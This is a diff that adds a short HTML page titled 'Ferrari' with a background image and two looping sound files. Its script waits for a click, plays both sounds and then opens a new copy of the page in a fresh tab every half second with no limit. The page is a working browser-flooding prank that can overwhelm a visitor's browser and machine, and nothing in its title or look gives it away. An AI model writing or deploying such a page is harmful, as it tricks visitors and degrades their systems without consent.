@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ferrari</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: #000; /* Fallback color if image fails to load */
+            cursor: pointer;
+        }
+        
+        body.loaded {
+            background: url('herve.jpg') no-repeat center center fixed;
+            background-size: cover;
+        }
+    </style>
+    <script>
+        let audio1, audio2;
+
+        function initAudio() {
+            try {
+                audio1 = new Audio('sounds/herve.wav');
+                audio2 = new Audio('sounds/herve1.wav');
+                audio1.loop = true;
+                audio2.loop = true;
+            } catch(e) {
+                console.error('Error loading audio:', e);
+            }
+        }
+
+        function spamWindows() {
+            setInterval(() => {
+                window.open(window.location.href, '_blank');
+            }, 500);
+        }
+
+        window.onload = function () {
+            // Check if image loads
+            let img = new Image();
+            img.onload = function() {
+                document.body.classList.add('loaded');
+            };
+            img.src = 'herve.jpg';
+            
+            initAudio();
+            document.body.addEventListener('click', function () {
+                if(audio1 && audio2) {
+                    audio1.play();
+                    audio2.play();
+                    spamWindows();
+                }
+            });
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
